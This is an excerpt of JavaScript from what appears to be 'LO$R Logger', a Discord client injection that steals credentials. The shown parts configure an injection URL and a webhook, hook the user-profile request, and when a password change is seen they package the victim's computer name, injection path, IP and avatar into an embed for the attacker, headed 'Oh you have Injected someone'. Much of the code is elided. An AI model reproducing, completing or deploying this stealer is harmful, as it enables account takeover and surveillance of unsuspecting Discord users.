...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/madhead341/LOSR-Logger",
    webhook: "%WEBHOOK%",
    Filter: {
        "urls": [
...
const makeEmbed = async ({
    ...
    var params = {
        ...
        embeds: [{
            ...
            footer: {
                text: "LO$R Logger | https://github.com/madhead341/LOSR-Logger"
            },
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    ...
                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Injected someone**](https://github.com/madhead341/LOSR-Logger)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
